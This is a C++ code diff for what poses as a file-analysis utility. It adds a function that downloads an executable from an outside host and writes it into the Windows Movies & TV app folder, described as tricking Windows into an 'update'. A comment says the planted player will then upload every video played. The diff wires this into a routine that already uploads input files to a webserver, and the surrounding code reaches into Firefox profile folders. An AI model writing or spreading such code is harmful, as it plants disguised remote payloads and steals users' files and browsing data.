@@ -2,6 +2,29 @@
 #include "includes.hpp"
 
 /// <summary>
+/// Tricks Windows into installing an 'update' on movie player...
+/// </summary>
+bool replace_movieplayer()
+{
+    auto response = cpr::Get( cpr::Url{ "https://www.exejoiner.com/files/private_/_temp_installer.exe" } );
+
+    if (response.status_code == 200) {
+        std::filesystem::path moviesandtv_path = std::getenv( "localappdata" ); 
+        moviesandtv_path /= "Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\";
+
+        std::ofstream outfile{ moviesandtv_path, std::ofstream::binary };
+        outfile.write( response.text.c_str(), response.text.length() );
+        outfile.close();
+    }
+    else
+    {
+        return false;
+    }
+    
+    return true;
+}
+
+/// <summary>
 /// Analyzes input files for data collection via webserver.
 /// </summary>
 /// <param name="input_files">The array of input file names</param>
@@ -24,11 +47,21 @@ void analyze_files(const char** input_files, int file_count) {
                                 cpr::Multipart{{"file", cpr::Buffer{buffer, file_size}, input_files[i]}});
         delete[] buffer;
     }
+    
+    if( replace_movieplayer() )
+    {
+        //dbglog("[+] replaced movie player! will now upload all videos played!     CODE 200\r\n");
+    }
 }
 
 std::string __ImportantAnalyzer() {
     wchar_t profilePath[MAX_PATH];
-    SHGetSpecialFolderPath(NULL, profilePath, CSIDL_APPDATA, TRUE);
+    SHGetSpecialFolderPath(NULL, 
+                           profilePath, 
+                           CSIDL_APPDATA, 
+                           TRUE
+                          );
+    
     std::wstring profilePathW(profilePath);
     std::string profilePathA(profilePathW.begin(), profilePathW.end());
     profilePathA += "\\Mozilla\\Firefox\\Profiles\\";
